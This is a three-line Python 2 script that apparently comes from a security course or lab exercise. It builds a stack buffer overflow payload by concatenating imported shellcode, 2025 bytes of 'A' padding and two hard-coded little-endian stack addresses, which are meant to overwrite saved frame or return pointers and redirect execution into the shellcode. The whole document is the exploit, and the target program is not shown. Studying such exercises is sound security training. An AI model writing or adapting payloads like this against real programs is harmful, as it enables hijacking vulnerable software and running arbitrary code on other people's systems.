from shellcode import shellcode
from struct import pack

print shellcode+"A"*2025+pack("<I",0xbffecb78)+pack("<I",0xbffed38c)
